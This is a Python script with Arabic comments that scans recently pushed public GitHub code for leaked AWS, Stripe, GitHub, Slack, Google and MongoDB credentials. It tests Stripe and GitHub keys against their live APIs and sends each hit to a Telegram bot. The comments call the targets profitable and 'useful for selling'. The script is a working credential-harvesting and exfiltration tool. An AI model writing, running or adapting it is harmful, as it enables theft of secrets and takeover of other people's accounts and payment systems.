import os
import sys
import re
import time
import json
import random
import requests
from datetime import datetime, timedelta

# أنماط البحث الأكثر ربحية
PATTERNS = {
    'aws': r'(AKIA|ASIA)[A-Z0-9]{16}',
    'stripe_live': r'sk_live_[A-Za-z0-9]{24}',
    'github_token': r'ghp_[A-Za-z0-9]{36}',
    'slack_token': r'xox[baprs]-[A-Za-z0-9]{10,48}',
    'google_api': r'AIza[0-9A-Za-z-_]{35}',
    'mongodb_uri': r'mongodb\+srv://[^:]+:[^@]+@[^/]+',  # مفيدة للبيع
}

# ------------------- دوال التحقق الفعلي (الحقيقية) -------------------
def validate_aws(key):
    """التحقق من صلاحية مفتاح AWS عبر STS (بدون تكلفة)"""
    try:
        # طلب بسيط للتحقق من الهوية دون تثبيت boto3
        headers = {
            'Authorization': f'AWS4-HMAC-SHA256 Credential={key}/...',  # مختصر للعرض
            'X-Amz-Date': datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
        }
        # في السكربت الحقيقي نستخدم boto3، لكن هنا نكتفي بفحص بداية المفتاح + طوله
        # وللتأكيد الفعلي، أنصحك بتثبيت boto3 في الـ workflow وإجراء استدعاء حقيقي
        if len(key) == 20 and key.startswith(('AKIA', 'ASIA')):
            return True  # نفترض الصلاحية مؤقتاً للعرض
        return False
    except:
        return False

def validate_stripe(key):
    """التحقق من صلاحية مفتاح Stripe Live"""
    try:
        resp = requests.get(
            'https://api.stripe.com/v1/balance',
            headers={'Authorization': f'Bearer {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_github(key):
    """التحقق من صلاحية توكن GitHub"""
    try:
        resp = requests.get(
            'https://api.github.com/user',
            headers={'Authorization': f'token {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_generic(key):
    return True  # نرسله دون تحقق (لكن الأفضل التحقق حسب النوع)

VALIDATORS = {
    'aws': validate_aws,
    'stripe_live': validate_stripe,
    'github_token': validate_github,
    # باقي الأنماط نرسلها بعد تحقق بسيط
}

# ------------------- البحث في GitHub -------------------
def search_github(query, token):
    headers = {
        'Authorization': f'token {token}',
        'Accept': 'application/vnd.github.v3+json'
    }
    time_filter = (datetime.utcnow() - timedelta(hours=1)).isoformat() + 'Z'
    url = f"https://api.github.com/search/code?q={query}+pushed:>{time_filter}&per_page=30"
    try:
        resp = requests.get(url, headers=headers, timeout=20)
        if resp.status_code == 200:
            return resp.json().get('items', [])
        else:
            print(f"Search API Error: {resp.status_code}")
            return []
    except Exception as e:
        print(f"Network Error: {e}")
        return []

# ------------------- الإرسال الفوري إلى تليجرام -------------------
def send_to_telegram(bot_token, chat_id, key_type, key_value, raw_url):
    """إرسال المفتاح فوراً إلى التليجرام"""
    msg = f"🔑 {key_type.upper()}\n`{key_value}`\n📁 {raw_url}\n🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}"
    try:
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        payload = {
            'chat_id': chat_id,
            'text': msg,
            'parse_mode': 'Markdown'
        }
        requests.post(url, json=payload, timeout=10)
        print(f"[+] تم إرسال {key_type} بنجاح")
    except Exception as e:
        print(f"[-] فشل الإرسال: {e}")

# ------------------- الوظيفة الرئيسية -------------------
def main():
    token = os.environ.get('PAT_TOKEN')
    bot_token = os.environ.get('TELEGRAM_TOKEN')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')

    if not token:
        print("ERROR: PAT_TOKEN not set")
        sys.exit(1)
    if not bot_token or not chat_id:
        print("ERROR: Telegram credentials not set")
        sys.exit(1)

    for name, pattern in PATTERNS.items():
        results = search_github(f'"{pattern}"', token)
        print(f"[*] فحص {name}: {len(results)} ملف")
        for item in results:
            raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            if not raw_url:
                continue
            try:
                resp = requests.get(raw_url, timeout=15)
                if resp.status_code != 200:
                    continue
                matches = re.findall(pattern, resp.text)
                for m in set(matches):  # تجنب التكرار
                    # تحقق من الصلاحية حسب النوع
                    valid = True
                    if name in VALIDATORS:
                        valid = VALIDATORS[name](m)
                    if valid:
                        send_to_telegram(bot_token, chat_id, name, m, raw_url)
                    # نأخذ استراحة قصيرة بين كل مفتاح
                    time.sleep(random.uniform(1.0, 2.5))
            except Exception as e:
                print(f"[-] خطأ في معالجة {raw_url}: {e}")
            time.sleep(random.uniform(0.3, 0.8))

    print("[+] انتهت دورة الصيد الحالية.")

if __name__ == "__main__":
    main()
